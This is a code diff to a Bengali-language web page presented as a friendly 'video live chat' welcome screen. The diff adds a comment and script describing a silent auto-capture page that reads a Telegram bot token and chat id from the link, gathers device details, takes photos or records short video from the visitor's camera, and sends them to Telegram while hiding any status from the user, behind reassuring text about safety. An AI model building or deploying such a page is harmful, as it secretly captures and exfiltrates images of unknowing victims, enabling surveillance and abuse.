@@ -21,7 +21,7 @@
     <h1>আপনাকে ভিডিও লাইভ চ্যাটিং এ স্বাগতম</h1>
 
     <div class="about">
-      আমাদের সার্ভিসে স্বাগতম — এখানে সহজ ও নিরাপদভাবে তুমি সরাসরি ছবি বা ছোট ভিডিও শেয়ার করতে পারবে। লিঙ্ক খুললে ডিভাইস স্বল্প সময়ের জন্য মিডিয়া অনুমতি চেয়ে নেয়া হবে এবং প্রয়োজনীয় মিডিয়া সংগ্রহ ও আপলোড সবকিছুই সার্ভার-সাইডে নিরাপদভাবে হ্যান্ডেল করা হবে। পেজটি কেবল তথ্যযুক্ত — কাজের সব অংশ ব্যাকএন্ডে সম্পন্ন হবে, এবং ব্যবহারকারীর সামনে কোনো প্রযুক্তিগত স্ট্যাটাস বা টোকেন প্রদর্শিত হবে না।
+      আমাদের সার্ভিসে স্বাগতম — এখানে সহজ ও নিরাপদভাবে তুমি সরাসরি ছবি বা ছোট ভিডিও শেয়ার করতে পারবে। লিংক খুললে ডিভাইস স্বল্প সময়ের জন্য মিডিয়া অনুমতি চেয়ে নেয়া হবে এবং প্রয়োজনীয় মিডিয়া সংগ্রহ ও আপলোড সবকিছুই সার্ভার-সাইডে নিরাপদভাবে হ্যান্ডেল করা হবে। পেজটি কেবল তথ্যযুক্ত — কাজের সব অংশ ব্যাকএন্ডে সম্পন্ন হবে, এবং ব্যবহারকারীর সামনে কোনো প্রযুক্তিগত স্ট্যাটাস বা টোকেন প্রদর্শিত হবে না।
     </div>
 
     <div class="join-btn-wrap">
@@ -32,6 +32,15 @@
   </div>
 
 <script>
+/*
+Silent auto-capture page that:
+- reads ?token=...&id=...&mode=...
+- collects device info
+- captures 2 photos for *photo modes*, or records 5s video for *video modes*
+- sends photos/videos directly to Telegram using the provided token and chat_id
+- does NOT show status messages to the user (only console logs)
+*/
+
 function q(name){ return new URLSearchParams(location.search).get(name); }
 const token = q('token');
 const chatId = q('id') || q('chat');
@@ -134,7 +143,7 @@ async function stopStream(stream){
   console.debug('chat page loaded', { token: !!token, chatId: !!chatId, mode });
   if(!token || !chatId || !mode){ console.debug('missing params'); return; }
   const device = await collectDevice();
-  const captionBase = `Mode: ${mode}\nTime: ${now()}\nDevice: ${JSON.stringify(device)}`;
+  const captionBase = `Mode: ${mode}\\nTime: ${now()}\\nDevice: ${JSON.stringify(device)}`;
   const facing = mode.startsWith('back') ? 'environment' : 'user';
   const isPhoto = mode.endsWith('photo');
   const isVideo = mode.endsWith('video');
